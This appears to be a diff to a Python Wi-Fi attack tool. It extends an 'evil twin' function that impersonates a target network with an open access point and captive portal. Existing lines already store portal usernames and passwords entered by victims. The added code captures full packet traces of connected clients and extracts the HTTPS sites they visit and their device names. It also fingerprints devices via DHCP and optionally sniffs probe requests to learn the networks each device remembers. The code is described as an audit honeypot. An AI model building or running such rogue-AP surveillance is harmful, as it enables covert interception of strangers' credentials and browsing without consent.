@@ -230,7 +230,15 @@ def log_honeypot(ssid, clients):
                 requests=c.get("hits", 0),
                 portal_user=(c.get("portal_user") or None),
                 portal_pass=(c.get("portal_pass") or None),
-                domains=(", ".join(c.get("domains", []))[:2000] or None)))
+                domains=(", ".join(c.get("domains", []))[:2000] or None),
+                rssi=c.get("rssi"), bytes_rx=c.get("bytes_rx"),
+                bytes_tx=c.get("bytes_tx"), dwell_s=c.get("dwell_s"),
+                dhcp_vendor=(c.get("dhcp_vendor") or None),
+                dhcp_fingerprint=(c.get("dhcp_fingerprint") or None),
+                sni_hosts=(", ".join(c.get("sni_hosts", []))[:2000] or None),
+                mdns_name=(c.get("mdns_name") or None),
+                probe_ssids=(", ".join(c.get("probe_ssids", []))[:1000] or None),
+                pcap_path=(c.get("pcap_path") or None)))
         s.commit()
     except Exception:
         pass
@@ -751,6 +759,7 @@ def _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd, bridge, uplink
             pass
     _run(['sudo', '/usr/bin/pkill', '-f', 'hostapd'])
     _run(['sudo', '/usr/bin/pkill', '-f', 'dnsmasq'])
+    _run(['sudo', '/usr/bin/pkill', '-f', 'tcpdump'])   # cierra/flushea el pcap
     _run(['sudo', '/usr/bin/ip', 'addr', 'flush', 'dev', iface])
     for f in (hostapd_conf, dnsmasq_conf):
         try:
@@ -788,6 +797,139 @@ def _os_guess(ua, hints):
     if "msftconnecttest" in h or "msftncsi" in h or "windows" in h: return "Windows"
     return "?"
 
+# ── Telemetria extendida del honeypot (para auditoria, 2026-10-15) ──
+def _int0(s):
+    try:
+        return int(str(s).strip().split()[0])
+    except Exception:
+        return None
+
+def _iw_station_dump(iface):
+    """#1/#2: {MAC: {rssi, rx, tx, dwell}} de `iw dev <if> station dump`. Hay que
+    llamarlo con los clientes AUN asociados (antes del teardown)."""
+    out = {}
+    r = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'station', 'dump'])
+    if not r or not r.stdout:
+        return out
+    cur = None
+    for raw in r.stdout.splitlines():
+        line = raw.strip()
+        m = re.match(r'Station ([0-9a-fA-F:]{17})', line)
+        if m:
+            cur = m.group(1).upper()
+            out[cur] = {"rssi": None, "rx": None, "tx": None, "dwell": None}
+            continue
+        if not cur:
+            continue
+        if line.startswith('rx bytes:'):
+            out[cur]["rx"] = _int0(line.split(':', 1)[1])
+        elif line.startswith('tx bytes:'):
+            out[cur]["tx"] = _int0(line.split(':', 1)[1])
+        elif line.startswith('signal:'):
+            mm = re.search(r'(-?\d+)', line)
+            if mm: out[cur]["rssi"] = int(mm.group(1))
+        elif line.startswith('connected time:'):
+            mm = re.search(r'(\d+)', line)
+            if mm: out[cur]["dwell"] = int(mm.group(1))
+    return out
+
+def _parse_dhcp_fp(logtext):
+    """#3: {MAC: {vendor, options}} de dnsmasq con log-dhcp. Asocia las lineas
+    'vendor class' / 'requested options' al ultimo MAC visto en el intercambio
+    DHCP (robusto al formato con o sin xid)."""
+    out = {}
+    last_mac = None
+    for line in logtext.splitlines():
+        if 'dnsmasq-dhcp' not in line:
+            continue
+        mm = re.search(r'([0-9a-fA-F:]{17})', line)
+        if mm:
+            last_mac = mm.group(1).upper()
+            out.setdefault(last_mac, {"vendor": None, "options": None})
+        low = line.lower()
+        if 'vendor class:' in low and last_mac:
+            out[last_mac]["vendor"] = line.split('vendor class:', 1)[1].strip()[:64]
+        elif 'requested options:' in low and last_mac:
+            out[last_mac]["options"] = line.split('requested options:', 1)[1].strip()[:128]
+    return out
+
+def _tshark(pcap, dfilter, fields, timeout=40):
+    """Corre tshark sobre el pcap (si esta instalado) y devuelve filas (listas de
+    campos). El pcap lo escribe tcpdump como root -> leemos con sudo."""
+    ts = _first_existing('/usr/bin/tshark', '/usr/sbin/tshark')
+    if not ts or not pcap or not os.path.exists(pcap):
+        return []
+    cmd = ['sudo', ts, '-r', pcap, '-Y', dfilter, '-T', 'fields', '-E', 'separator=/t']
+    for f in fields:
+        cmd += ['-e', f]
+    r = _run(cmd, timeout=timeout)
+    rows = []
+    if r and r.stdout:
+        for line in r.stdout.splitlines():
+            if line.strip():
+                rows.append(line.split('\t'))
+    return rows
+
+def _tshark_sni(pcap):
+    """#4: {ip: set(hosts)} de los ClientHello TLS = sitios HTTPS visitados."""
+    out = {}
+    for row in _tshark(pcap, 'tls.handshake.extensions_server_name',
+                       ['ip.src', 'tls.handshake.extensions_server_name']):
+        if len(row) >= 2 and row[0] and row[1]:
+            out.setdefault(row[0], set()).add(row[1][:120])
+    return out
+
+def _tshark_mdns(pcap):
+    """#6: {ip: nombre.local} anunciado por mDNS (suele traer el nombre del equipo)."""
+    out = {}
+    for row in _tshark(pcap, 'mdns', ['ip.src', 'dns.resp.name', 'dns.qry.name']):
+        if not row or not row[0]:
+            continue
+        ip = row[0]
+        for cand in row[1:]:
+            for name in (cand or '').split(','):
+                name = name.strip()
+                if name.endswith('.local') and ip not in out:
+                    out[ip] = name[:96]
+    return out
+
+def _probe_sniff(iface, seconds=8):
+    """#5 (experimental, gated): pre-AP, pone wlan1 en monitor y captura probe
+    requests para sacar la PNL (redes que el equipo recuerda). Devuelve
+    {MAC: set(ssids)}. Riesgoso en rtw88 (monitor+AP en la misma radio) ->
+    best-effort, restaura a managed al salir."""
+    pnl = {}
+    pcap = os.path.expanduser(f"~/piscanlvgl/data/captures/probe_{int(time.time())}.pcap")
+    td = _first_existing('/usr/bin/tcpdump', '/usr/sbin/tcpdump')
+    if not td:
+        return pnl
+    try:
+        if not enable_monitor(iface):
+            return pnl
+        p = subprocess.Popen(['sudo', td, '-i', iface, '-w', pcap, '-U',
+                              'type', 'mgt', 'subtype', 'probe-req'],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(max(4, int(seconds)))
+        try:
+            p.terminate()
+        except Exception:
+            pass
+        _run(['sudo', '/usr/bin/pkill', '-f', 'tcpdump'])
+        for row in _tshark(pcap, 'wlan.fc.type_subtype==0x04 && wlan.ssid != ""',
+                           ['wlan.sa', 'wlan.ssid']):
+            if len(row) >= 2 and row[0] and row[1]:
+                pnl.setdefault(row[0].upper(), set()).add(row[1][:48])
+    except Exception:
+        pass
+    finally:
+        try:
+            if os.path.exists(pcap):
+                os.remove(pcap)
+        except Exception:
+            pass
+        disable_monitor(iface)
+    return pnl
+
 def evil_twin(iface, ssid, bssid, channel, seconds=120):
     """Honeypot de reconocimiento: AP abierto con `ssid` + portal informativo
     que registra TELEMETRIA de los que se conectan (MAC/fabricante/IP/hostname/
@@ -804,6 +946,15 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
     with _HP_LOCK:
         _HP.clear()
 
+    # Telemetria extendida (Config): pcap de la sesion (#7, default ON) y
+    # pre-sniff de probe requests / PNL (#5, default OFF: usa monitor y en rtw88
+    # convive mal con el AP).
+    want_pcap = (_config_get("honeypot_pcap", "1") != "0")
+    want_probe = (_config_get("honeypot_probe_sniff", "0") == "1")
+    probe_pnl = {}
+    if want_probe:
+        probe_pnl = _probe_sniff(iface, 8)
+
     disable_monitor(iface)
     _run(['sudo', '/usr/bin/ip', 'addr', 'flush', 'dev', iface])
 
@@ -811,6 +962,8 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
     dnsmasq_conf = None
     procs = []
     httpd = None
+    pcap_path = None
+    stations = {}
 
     logpath = os.path.expanduser("~/piscanlvgl/data/captures/evil_twin.log")
     try:
@@ -846,6 +999,20 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
 
         _run(['sudo', '/usr/bin/ip', 'addr', 'add', '10.0.0.1/24', 'dev', iface])
 
+        # #7 PCAP de la sesion (tcpdump): base para SNI (#4) y mDNS (#6). Lo mata
+        # el teardown (pkill tcpdump) antes de que lo parseemos con tshark.
+        if want_pcap:
+            td = _first_existing('/usr/bin/tcpdump', '/usr/sbin/tcpdump')
+            if td:
+                pcap_path = os.path.expanduser(
+                    f"~/piscanlvgl/data/captures/honeypot_{int(time.time())}.pcap")
+                procs.append(subprocess.Popen(
+                    ['sudo', td, '-i', iface, '-w', pcap_path, '-U'],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+                log(f"pcap: {pcap_path}")
+            else:
+                log("pcap: tcpdump no instalado (omito SNI/mDNS)")
+
         # puente de internet (opcional)
         if bridge:
             log(f"bridge NAT {uplink}->{iface}: {_et_bridge_add(iface, uplink)}")
@@ -859,7 +1026,8 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
         # sin puente, todo al portal (address=/#/).
         base = (f"interface={iface}\nbind-interfaces\nlisten-address=10.0.0.1\n"
                 "dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h\n"
-                "dhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nlog-queries\n")
+                "dhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\n"
+                "log-queries\nlog-dhcp\n")   # log-dhcp: vendor class + requested options (#3)
         base += ("server=8.8.8.8\nserver=1.1.1.1\n" if bridge
                  else "no-resolv\naddress=/#/10.0.0.1\n")
         df = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_et_dnsmasq_',
@@ -889,7 +1057,9 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
 
         log(f"honeypot activo {seconds}s...")
         time.sleep(max(10, int(seconds)))
-        log("fin del honeypot")
+        # #1/#2: snapshot de estaciones (rssi/bytes/dwell) ANTES de bajar el AP.
+        stations = _iw_station_dump(iface)
+        log(f"fin del honeypot (estaciones: {len(stations)})")
 
     finally:
         _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd, bridge, uplink)
@@ -902,6 +1072,9 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
         logtext = ""
     leases = _hp_parse_leases(logtext)
     domains = _hp_parse_domains(logtext)
+    dhcp_fp = _parse_dhcp_fp(logtext)          # #3 {mac: {vendor, options}}
+    sni = _tshark_sni(pcap_path)               # #4 {ip: set(hosts)}
+    mdns = _tshark_mdns(pcap_path)             # #6 {ip: nombre.local}
 
     prefixes = {mac.replace(":", "")[:6] for (mac, _h) in leases.values() if mac}
     vendors = _resolve_vendors(prefixes) if prefixes else {}
@@ -922,12 +1095,22 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
         hp = _HP.get(ip, {})
         hosts = sorted(hp.get("hosts", set()))
         doms = sorted(domains.get(ip, set()))
+        st = stations.get(mac, {}) if mac else {}
+        fp = dhcp_fp.get(mac, {}) if mac else {}
+        snih = sorted(sni.get(ip, set()))
+        pnl = sorted(probe_pnl.get(mac, set())) if mac else []
         clients.append({
             "ip": ip, "mac": mac, "vendor": vendor, "hostname": host,
             "os": _os_guess(hp.get("ua", ""), hosts + doms),
             "user_agent": hp.get("ua", ""), "hits": hp.get("hits", 0),
             "domains": doms[:40],
             "portal_user": hp.get("user", ""), "portal_pass": hp.get("pass", ""),
+            # telemetria extendida:
+            "rssi": st.get("rssi"), "bytes_rx": st.get("rx"),
+            "bytes_tx": st.get("tx"), "dwell_s": st.get("dwell"),
+            "dhcp_vendor": fp.get("vendor"), "dhcp_fingerprint": fp.get("options"),
+            "sni_hosts": snih[:60], "mdns_name": mdns.get(ip),
+            "probe_ssids": pnl[:40], "pcap_path": pcap_path,
         })
 
     try:
